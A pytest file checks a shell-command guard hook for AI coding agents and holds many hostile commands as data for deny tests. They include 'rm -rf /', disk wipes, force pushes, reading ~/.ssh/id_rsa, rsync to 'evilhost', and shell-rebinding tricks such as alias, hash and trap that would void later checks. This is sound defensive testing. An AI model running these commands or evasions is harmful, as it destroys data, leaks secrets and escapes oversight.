# Copyright (c) 2026 Brad Duhon.
# SPDX-License-Identifier: GPL-3.0-or-later
# 0044: the shell_tripwires hook; cases copied from tests/test_jail.py run each agent's chain.
from __future__ import annotations

import json
from pathlib import Path

import pytest
from lib import shell

from tests.conftest import CFG, CWD, REPO_ROOT, WT
from tests.hook_chain import (
    decide,
    evaluate,
    internal_error_denies,
    malformed_input_denies,
    outside_tools_allow,
    payload,
    run_script,
    unknown_flag_denies,
)
from tests.test_jail import (
    BASH_AGENTS,
    PIPE_ALLOWED,
    SEPARATORS,
    WORKERS_WITH_SHELL,
    _b,
    _cwd,
    _narrowed_repo,
    _unit_repo,
    fake_claude_fixture,  # noqa: F401 - registers fake_claude
)

pytestmark = pytest.mark.usefixtures("jail_fakes")
HOOK = "shell_tripwires"
WORKERS = ("repo-coder", "pr-train-conductor", "charter-docs")


@pytest.mark.parametrize(
    "command",
    [
        "git push --force origin main",
        "git push -f origin main",
        "git push origin --delete x",
        "git push --force-with-lease",
        "rm -rf /",
        "sudo mkfs.ext4 /dev/sda",
        "dd if=/dev/zero of=/dev/sda",
        "git clean -fd",
        "git commit -S -m x",
        "gpg --sign x",
        "ssh-keygen -Y sign -f k x",
    ],
)
def test_universal_tripwires_block_everyone(command: str) -> None:
    for agent in WORKERS:
        assert not decide(_b(agent, command), CFG).allow, (agent, command)


@pytest.mark.parametrize("command", [c for c in SEPARATORS if "||" not in c])
@pytest.mark.parametrize("agent", BASH_AGENTS)
def test_separator_matrix_blocks(agent: str | None, command: str) -> None:
    # O3: a redirect to f is a write outside every agent's boundary; || is allowed below.
    d = decide(_b(agent, command), CFG)
    assert not d.allow and "Next:" in d.reason, (agent, command)


@pytest.mark.parametrize(
    "agent", [a for a in BASH_AGENTS if a not in PIPE_ALLOWED and a != "repo-coder"]
)
def test_pipe_blocked_where_not_allowed(agent: str) -> None:
    # B1: no pipe flag; head with no path is outside the docs and conductor allowlists.
    d = decide(_b(agent, "git diff | head"), CFG)
    assert not d.allow and "Next:" in str(d.reason), agent


def test_coder_pipe_into_head_is_allowed() -> None:
    for command in ("git diff | head", "pytest -q | tail -n 5", "git log --oneline | wc -l"):
        assert decide(_b("repo-coder", command), CFG).allow, command
    for agent in WORKERS:
        assert evaluate(HOOK, _b(agent, "git diff | head")) is None, agent


def test_or_chain_is_allowed_to_workers() -> None:
    # O3: || is judged segment by segment like && and |.
    for agent in WORKERS:
        assert evaluate(HOOK, _b(agent, "ls || true")) is None, agent
    assert decide(_b("repo-coder", "git diff || git status"), CFG).allow
    d = decide(_b("repo-coder", "ls || git push --force origin x"), CFG)
    assert not d.allow and d.reason == shell.R_FORCE_PUSH


@pytest.mark.parametrize(
    "command",
    [
        "git push origin +main",
        "git push origin :main",
        "git -C . push --force",
        "git -C /x -c a=b push -f origin x",
        "git push -fu origin x",
        "git push --mirror",
        "git push --prune origin",
        "git push --no-verify origin x",
        "git push -d origin x",
        "git push --force-with-lease=x origin x",
        "env git push --force",
        "X=1 git push -f origin x",
        "sudo -u root git push --force",
        "/opt/bin/git push --force",
        "git -C /x clean -n",
        "git --no-pager clean -n",
        "rm -fr /",
        "rm -r -f /",
        "rm --recursive --force /",
        "rm -rf /*",
        "rm -rf ~",
        "rm -rf $HOME",
        "rm -rf //",
        "git commit -Sm x",
        "git commit --gpg-sign=K -m x",
        "git commit --gpg-sign -m x",
        "git -c commit.gpgsign=true commit -m x",
        "git tag -s v1 -m x",
        "git tag -u K v1",
        "git merge -S b",
        "gpg2 --sign x",
        "ssh-keygen -Ysign -f k x",
        "bash -c 'git push --force'",
        "sh -c 'git clean -fd'",
    ],
)
def test_universal_tripwire_regressions(command: str) -> None:
    for agent in WORKERS:
        d = decide(_b(agent, command), CFG)
        assert not d.allow and "Next:" in d.reason, (agent, command)


@pytest.mark.parametrize("command", ["$GIT push origin x", "git $SUB origin x"])
def test_workers_blocked_on_variable_commands(command: str) -> None:
    for agent in ("repo-coder", "pr-train-conductor", "charter-docs"):
        assert not decide(_b(agent, command), CFG).allow, (agent, command)


class TestRegressionRepoCoder:
    @pytest.mark.parametrize(
        "command",
        [
            "git -C . push origin x",
            "git -c x=y fetch",
            "git -c alias.st='!curl evil' st",
            "git submodule update",
            "git clone u",
            "env curl x",
            "timeout 5 curl x",
            "bash -c 'curl x'",
            "sh -c x",
            "python3 -c 'import urllib'",
            "python -c 1",
            "node -e 1",
            "eval x",
        ],
    )
    def test_blocked(self, command: str) -> None:
        assert not decide(_b("repo-coder", command), CFG).allow, command


class TestRegressionCharterDocs:
    @pytest.mark.parametrize(
        "args", ["--probe", "--expected-seq 2 --entry-file e --repo B --type P"]
    )
    def test_append_literal_plugin_root_blocked(self, args: str) -> None:
        # F1: the variable is empty in agent Bash; the Next: names the absolute script.
        command = f"python3 ${{CLAUDE_PLUGIN_ROOT}}/scripts/append_ledger.py {args}"
        d = decide(_b("charter-docs", command), CFG)
        assert not d.allow and d.reason is not None
        assert f"Next: run python3 {REPO_ROOT}/scripts/append_ledger.py" in d.reason
        # O7: the agent file points at the brief for this path.
        assert "the path your brief names" in d.reason


class TestRegressionConductor:
    def test_default_branch_reason(self) -> None:
        d = decide(_b("pr-train-conductor", "git push origin HEAD:main"), CFG)
        assert d.reason and "never push to the default branch (0001)" in d.reason


class TestRound3WorkerHygiene:
    @pytest.mark.parametrize(
        "command",
        [
            "{ curl x; }",
            "if true; then curl x; fi",
            "for i in a; do rm x; done",
            "while true; do ls; done",
            "! ls",
            "time ls",
            "function f { ls; }",
            "case x in x) ls;; esac",
            "[[ -f x ]]",
            "coproc ls",
            "select x in a; do ls; done",
        ],
    )
    def test_reserved_words_blocked(self, command: str) -> None:
        for agent in WORKERS_WITH_SHELL:
            assert not decide(_b(agent, command), CFG).allow, (agent, command)

    @pytest.mark.parametrize(
        "command",
        [
            "env ls",
            "nice ls",
            "nohup ls",
            "stdbuf -oL ls",
            "timeout 5 ls",
            "exec ls",
            "eval ls",
            "xargs ls",
            "command ls",
            "builtin ls",
            "source x.sh",
            ". x.sh",
            "sh x.sh",
            "bash x.sh",
            "zsh x.sh",
            "dash x.sh",
            "python x.py",
            "python3 x.py",
            "node -e 1",
            "perl x.pl",
            "ruby x.rb",
            "sudo ls",
        ],
    )
    def test_wrappers_blocked(self, command: str) -> None:
        for agent in WORKERS_WITH_SHELL:
            assert not decide(_b(agent, command), CFG).allow, (agent, command)

    @pytest.mark.parametrize(
        "command",
        [
            "GIT_DIR=/x git status",
            "GIT_SSH_COMMAND=x git status",
            "GIT_CONFIG_PARAMETERS=x git status",
            "GIT_EXTERNAL_DIFF=x git diff",
            "cat ~/.ssh/id_rsa",
            "cat $HOME/x",
            "ls {a,b}",
            "git diff ${X}",
        ],
    )
    def test_env_and_token_hygiene(self, command: str) -> None:
        for agent in WORKERS_WITH_SHELL:
            assert not decide(_b(agent, command), CFG).allow, (agent, command)

    def test_runner_forms_still_allowed(self) -> None:
        for command in ("python3 -m pytest -q", "node t.js", "uv run pytest"):
            assert decide(_b("repo-coder", command), CFG).allow, command


class TestQuotedHygiene:
    @pytest.mark.parametrize(
        "command",
        [
            f"sed -n '$p' {WT}/src/a.py",
            "printf '%s ${x} {a,b} ~ \\n'",
            f"cat '{WT}/a\\b'",
            "git log --format='%H ${x}'",
        ],
    )
    def test_dollar_inside_single_quotes_passes_hygiene(self, command: str) -> None:
        # O4: a single-quoted span is literal to the shell.
        assert evaluate(HOOK, _b("repo-coder", command)) is None, command
        assert decide(_b("repo-coder", command), CFG).allow, command

    @pytest.mark.parametrize(
        "command",
        [
            f"sed -n $p {WT}/src/a.py",
            'cat "$HOME/x"',
            "cat ~/x",
            "cat a\\ b",
            'git log --format="${x}"',
            "printf $'\\x41'",
            "cat '~'/x x${y}",
        ],
    )
    def test_dollar_outside_quotes_is_refused(self, command: str) -> None:
        # O4: unquoted and double-quoted spans still expand.
        assert evaluate(HOOK, _b("repo-coder", command)) == shell.R_HYGIENE, command


class TestLiveRunGrammar:
    @pytest.mark.parametrize(
        "command",
        ["python3 -m mypy src tests", "python3 -m mypy src/hello.py", "python -m mypy src"],
    )
    def test_mypy_with_paths_allowed(self, command: str) -> None:
        assert decide(_b("repo-coder", command), CFG).allow, command

    @pytest.mark.parametrize(
        "command",
        [
            "python3 -m pytest -q",
            "python3 -m mypy --strict src",
            "python3 -m ruff check scripts tests",
            "python3 -m unittest discover",
            "python -m coverage report",
        ],
    )
    def test_python3_dash_m_module_is_allowed(self, command: str) -> None:
        # B2 narrowed by audit finding (c) of Build Train 20261019-124612: the five runners only.
        assert decide(_b("repo-coder", command), CFG).allow, command

    @pytest.mark.parametrize(
        "command",
        [
            "python3 -m pip install requests",
            "python3 -m http.server 8000",
            "python3 -m zipfile -e a.zip /tmp",
            "python -m json.tool in.json out.json",
            "python3 -m pytest_cov",
            "python3 -m coverage.run",
        ],
    )
    def test_python3_dash_m_other_module_is_refused(self, command: str) -> None:
        # B2, finding (c): network_tools and unit_writes never see what another module does.
        assert evaluate(HOOK, _b("repo-coder", command)) == shell.R_INLINE, command

    @pytest.mark.parametrize(
        "command",
        ["python3 -c 'import mypy'", "python3 -W error -m mypy src", "python3 -I -m mypy src"],
    )
    def test_mypy_flags_blocked(self, command: str) -> None:
        # B2: flags after -m mypy pass; interpreter flags before -m and -c still refuse.
        assert not decide(_b("repo-coder", command), CFG).allow, command

    @pytest.mark.parametrize("command", ["python3 @args.txt", "python3 -m @args"])
    def test_mypy_argfile_blocked(self, command: str) -> None:
        # B2: an @file in the interpreter slot is neither a module name nor a worktree script.
        assert not decide(_b("repo-coder", command), CFG).allow, command

    @pytest.mark.parametrize(
        "command",
        [
            "python3 -m",
            "python3 -m -c 1",
            "python3 -m 'a b'",
            "python3 -m pytest --basetemp=/tmp/x",
            "python3",
        ],
    )
    def test_python3_other_forms_refused(self, command: str) -> None:
        assert not decide(_b("repo-coder", command), CFG).allow, command

    def test_python3_path_inside_own_worktree_is_allowed(self, tmp_path: Path) -> None:
        # B2: a script that resolves under the coder's unit worktree.
        assert decide(_b("repo-coder", f"python3 {WT}/scripts/x.py --flag"), CFG).allow
        repo, wt = _unit_repo(tmp_path / "repo")
        for command in (
            f"python3 {wt}/scripts/x.py",
            f"cd {wt} && python3 scripts/x.py",
            f"cd {wt}/scripts && python3 x.py | head",
        ):
            assert decide(_cwd(_b("repo-coder", command), repo), CFG).allow, command

    def test_python3_path_outside_worktree_is_refused(self, tmp_path: Path) -> None:
        for command in (
            "python3 /tmp/x.py",
            "python3 scripts/x.py",
            f"python3 {CWD}/scripts/x.py",
            f"python3 {WT}/../x.py",
            f"python3 {CWD}/.claude/worktrees/u2/x.py",
        ):
            assert evaluate(HOOK, _b("repo-coder", command)) == shell.R_INLINE, command
        for agent in ("charter-docs", "pr-train-conductor"):
            assert evaluate(HOOK, _b(agent, f"python3 {WT}/x.py")) == shell.R_INLINE, agent
        repo, wt = _unit_repo(tmp_path / "repo")
        for command in (
            f"cd /tmp && python3 {wt.name}/x.py",
            f"cd {wt}; python3 x.py",
            f"cd {wt} && cd scripts && python3 x.py",
            f"cd {wt} || python3 x.py",
        ):
            got = evaluate(HOOK, _cwd(_b("repo-coder", command), repo))
            assert got == shell.R_INLINE, command


class TestDeclaredCommands:
    STACK = {
        "unit_test_cmd": "bash scripts/test.sh",
        "typecheck_cmd": "python3 -X dev -m mypy src",
        "lint_cmd": "env CI=1 ruff check .",
    }

    def _repo(self, tmp_path: Path) -> Path:
        repo, _ = _narrowed_repo(tmp_path, json.dumps({"stack": self.STACK}))
        return repo

    def test_declared_unit_test_cmd_runs_verbatim(self, tmp_path: Path) -> None:
        # B2: the manifest's command runs as one segment, exactly as declared.
        repo = self._repo(tmp_path)
        for command in ("bash scripts/test.sh", "env CI=1 ruff check ."):
            assert decide(_cwd(_b("repo-coder", command), repo), CFG).allow, command
        for command in ("bash scripts/other.sh", "bash scripts/test.sh -x", "env CI=1 ruff"):
            got = evaluate(HOOK, _cwd(_b("repo-coder", command), repo))
            assert got == shell.R_INLINE, command

    def test_declared_typecheck_cmd_runs_verbatim(self, tmp_path: Path) -> None:
        repo = self._repo(tmp_path)
        command = "python3 -X dev -m mypy src"
        assert decide(_cwd(_b("repo-coder", command), repo), CFG).allow
        assert evaluate(HOOK, _cwd(_b("repo-coder", f"{command} tests"), repo)) == shell.R_INLINE
        # B2: the exemption is the coder's; other agents keep their grammar.
        got = evaluate(HOOK, _cwd(_b("charter-docs", command), repo))
        assert got == shell.R_INLINE

    def test_undeclared_repo_has_no_verbatim_commands(self, tmp_path: Path) -> None:
        repo, _ = _unit_repo(tmp_path / "repo")
        got = evaluate(HOOK, _cwd(_b("repo-coder", "bash scripts/test.sh"), repo))
        assert got == shell.R_INLINE


class TestNestedClaudeAndPathCommands:
    # issue 55: the command word resolves to its real file; a coder's path command is placed.
    @pytest.mark.parametrize("agent", WORKERS)
    def test_claude_by_real_path_is_refused(self, fake_claude: Path, agent: str) -> None:
        for command in (f"{fake_claude} -p hi", "claude -p hi"):
            assert evaluate(HOOK, _b(agent, command)) == shell.R_CLAUDE_PATH, (agent, command)

    def test_claude_link_inside_the_worktree_is_refused(
        self, fake_claude: Path, tmp_path: Path
    ) -> None:
        repo, wt = _unit_repo(tmp_path / "repo")
        (wt / "c").symlink_to(fake_claude)
        for command in (f"{wt}/c -p hi", f"cd {wt} && ./c -p hi"):
            got = evaluate(HOOK, _cwd(_b("repo-coder", command), repo))
            assert got == shell.R_CLAUDE_PATH, command

    @pytest.mark.parametrize(
        "command",
        ["/usr/bin/cat x", f"{WT}/scripts/run.sh", f"cd {WT} && ./scripts/run.sh", "ls x"],
    )
    def test_coder_path_command_in_a_trusted_place_is_allowed(self, command: str) -> None:
        assert evaluate(HOOK, _b("repo-coder", command)) is None, command

    def test_declared_executables_run_by_absolute_path(self, tmp_path: Path) -> None:
        # issue 55: the manifest's own pytest and ruff, anchored at the project root, are trusted.
        stack = {"unit_test_cmd": ".venv/bin/pytest -q", "lint_cmd": ".venv/bin/ruff check ."}
        repo, wt = _narrowed_repo(tmp_path, json.dumps({"stack": stack}))
        for command in (
            f"cd {wt} && {repo}/.venv/bin/pytest -q tests/test_a.py",
            f"cd {wt} && {repo}/.venv/bin/ruff check scripts",
        ):
            assert evaluate(HOOK, _cwd(_b("repo-coder", command), repo)) is None, command
        for command in (f"{repo}/.venv/bin/pip install x", f"{repo}/.venv/bin/python -c 1"):
            got = evaluate(HOOK, _cwd(_b("repo-coder", command), repo))
            assert got == shell.R_UNTRUSTED_PATH, command


@pytest.mark.parametrize(
    "command",
    [
        "/tmp/x/tool",
        f"{CWD}/.venv/bin/python scripts/x.py",
        f"cd {WT} && {CWD}/.venv/bin/pytest -q",
        "./tool",
        f"{WT}/../tool",
    ],
)
def test_coder_path_command_elsewhere_is_refused(command: str) -> None:
    # issue 55: outside the bin folders, a unit worktree and the manifest's declared commands.
    assert evaluate(HOOK, _b("repo-coder", command)) == shell.R_UNTRUSTED_PATH, command


class TestCoderFrictionRows:
    # Train A friction bin: the coder's pipes and interpreter calls that A6 allows.
    @pytest.mark.parametrize(
        "command",
        [
            f"cd {WT} && grep -rn -E 'a|b' --include=*.py scripts | grep -v '^scripts/docs/'",
            f"cd {WT} && grep -n 'class Decision' -A 15 scripts/lib/jail.py | head -60",
            f"cd {WT} && python3 scripts/catalog.py matrix",
            f"python3 {WT}/scripts/verify_audit_chain.py /tmp/x.jsonl",
            f"cat {WT}/a.md && grep -n plan {WT}/b.md | head",
        ],
    )
    def test_confirmed_allowed(self, command: str) -> None:
        assert decide(_b("repo-coder", command), CFG).allow, command

    @pytest.mark.parametrize(
        ("command", "want"),
        [
            ("python3 --version", shell.R_INLINE),
            (f"cd {WT} && {CWD}/.venv/bin/python scripts/catalog.py table", shell.R_UNTRUSTED_PATH),
        ],
    )
    def test_habits_stay_refused(self, command: str, want: str) -> None:
        assert evaluate(HOOK, _b("repo-coder", command)) == want, command


class TestProjectDataDir:
    @pytest.mark.parametrize("agent", ["repo-coder", "pr-train-conductor"])
    @pytest.mark.parametrize(
        "command",
        [
            "git add .claude/daedalus/config.json",
            "git add -f .claude/daedalus",
            "git add ./.claude/daedalus/audit",
            f"git add {CWD}/.claude/daedalus/config.json",
            "git stage .claude/daedalus/config.json",
            "git commit -m x -- .claude/daedalus/config.json",
            "git commit -m x .claude/daedalus/config.json",
            "git -C .claude add daedalus",
            "git -C .claude/daedalus add config.json",
            "git add -- .claude/daedalus",
            "git add :/.claude/daedalus",
        ],
    )
    def test_git_add_commit_of_data_dir_blocks(self, agent: str | None, command: str) -> None:
        d = decide(_b(agent, command), CFG)
        assert not d.allow and "never committed" in str(d.reason), (agent, command)


@pytest.mark.parametrize("agent", ["repo-coder", "contract-spec", "charter-docs"])
@pytest.mark.parametrize(
    "command",
    [
        f"export GIT_WORK_TREE={CWD}; git -C {WT} restore -- src/a.py",
        f"export GIT_DIR={CWD}/.git; git -C {WT} restore -- src/a.py",
        f"export GIT_WORK_TREE={CWD}; git -C {WT}/src restore -- :/src/a.py",
        f"declare -x FOO=1; tee {WT}/src/a.py",
        "typeset -x FOO=1",
        "readonly FOO=1",
        "export FOO",
        "set -a",
        "set -ea",
        "set -o allexport",
    ],
)
def test_worker_shell_variable_export_is_refused(agent: str, command: str) -> None:
    d = decide(_b(agent, command), CFG)
    # 0039: contract-spec lists no Bash tool, so tool_bound refuses it before any shell check.
    want = "allowlisted tools" if agent == "contract-spec" else "shell variables"
    assert not d.allow and want in str(d.reason), (agent, command)


@pytest.mark.parametrize("agent", ["repo-coder", "contract-spec", "charter-docs"])
@pytest.mark.parametrize(
    "command",
    [
        f"hash pytest=/bin/rm; pytest {CWD}/infra/a.tf",
        "hash -p /bin/rm pytest; pytest x",
        f"alias git=tee; git -C {WT} status",
        "unalias ls",
        "unset PATH; git status",
        "shopt -s expand_aliases",
        "enable -n test",
        "setopt aliases",
        "unsetopt hashcmds",
        "builtin cd /tmp",
        "command rm x",
        "eval ls",
        "exec ls",
        "source x.sh",
        ". x.sh",
    ],
)
def test_worker_shell_state_builtins_are_refused(agent: str, command: str) -> None:
    # 0022: a builtin that rebinds what a later segment runs voids every later check.
    assert not decide(_b(agent, command), CFG).allow, (agent, command)


@pytest.mark.parametrize("agent", ["repo-coder", "contract-spec", "charter-docs"])
@pytest.mark.parametrize(
    "command",
    [
        f"trap 'git -C {CWD} commit -am x' EXIT; ls",
        f"printf -v PATH {CWD}/bin; pytest {CWD}/infra/a.tf",
        "printf -vPATH x",
        "getopts PATH x; git status",
    ],
)
def test_worker_trap_getopts_printf_v_refused(agent: str, command: str) -> None:
    # 0022: a trap body runs unchecked; printf -v and getopts rebind a variable such as PATH.
    assert not decide(_b(agent, command), CFG).allow, (agent, command)


def test_coder_plain_printf_allowed() -> None:
    assert decide(_b("repo-coder", "printf 'x y'"), CFG).allow


def test_coder_rsync_remote_refused_from_unit_worktree_cwd(tmp_path: Path) -> None:
    _, wt = _unit_repo(tmp_path / "repo")
    (wt / "src").mkdir()
    for command in (f"rsync {wt}/src/a.py evilhost:x", f"rsync -e touch {wt}/src/a.py evilhost:x"):
        assert not decide(_cwd(_b("repo-coder", command), wt / "src"), CFG).allow, command


@pytest.mark.parametrize(
    "command",
    ["pytest -q 2>&1", "git diff 2>/dev/null", "ls 2> /dev/null | head", "pytest -q 2>&1 | tail"],
)
def test_stderr_dup_is_a_noop(command: str) -> None:
    # O3: fd duplication and discard change no file.
    assert evaluate(HOOK, _b("repo-coder", command)) is None, command
    assert decide(_b("repo-coder", command), CFG).allow, command


@pytest.mark.parametrize(
    "command", ["git status >/dev/null", "ls &>/dev/null", "ls > /dev/null", "ls 1>/dev/null"]
)
def test_stdout_to_dev_null_is_a_noop(command: str) -> None:
    assert evaluate(HOOK, _b("repo-coder", command)) is None, command
    assert decide(_b("repo-coder", command), CFG).allow, command


@pytest.mark.parametrize(
    "command",
    [
        "git diff >&2",
        "git diff 1>&2",
        "git diff 3> f",
        "git diff 12>f",
        "ls >| f",
        "ls > -a",
        "ls > $HOME/x",
        "ls > 'f'",
        "ls > *.txt",
        "cat < f",
        "ls >(cat)",
        "ls >",
        "> f",
        "echo $(id)",
        "echo `id`",
    ],
)
def test_unsupported_redirects_and_substitution_refused(command: str) -> None:
    for agent in WORKERS:
        assert evaluate(HOOK, _b(agent, command)) == shell.R_UNSUPPORTED, (agent, command)


def test_shell_tripwires_judges_the_hook_alone() -> None:
    assert evaluate(HOOK, _b("repo-coder", "ls || true")) is None
    assert evaluate(HOOK, _b("repo-coder", "git diff | head")) is None
    assert evaluate(HOOK, _b("repo-coder", "CI=1")) == shell.R_ENV
    assert evaluate(HOOK, _b("repo-coder", "CI=1 pytest -q")) is None


def test_shell_tripwires_fixture_decisions() -> None:
    allow = {"decision": "allow", "reason": ""}
    force = payload("Bash", command="git push --force origin x")
    assert run_script(HOOK, force) == {"decision": "deny", "reason": shell.R_FORCE_PUSH}
    assert run_script(HOOK, payload("Bash", command="git log | head")) == allow
    assert run_script(HOOK, payload("Bash", command="pytest -q")) == allow


def test_shell_tripwires_allows_tools_outside_its_tools() -> None:
    outside_tools_allow(HOOK, "Write")


def test_shell_tripwires_unknown_flag_denies() -> None:
    unknown_flag_denies(HOOK, payload("Bash", command="ls"))
    # B1: the pipe flag is gone, so an agent file still passing it fails closed.
    got = run_script(HOOK, payload("Bash", command="ls"), "--no-pipes")
    want = "hook shell_tripwires failed closed (unknown flag --no-pipes)"
    assert got == {"decision": "deny", "reason": want}


def test_shell_tripwires_malformed_input_denies() -> None:
    malformed_input_denies(HOOK)


def test_shell_tripwires_internal_error_denies_and_names_the_hook() -> None:
    internal_error_denies(HOOK, payload("Bash", command="ls"))
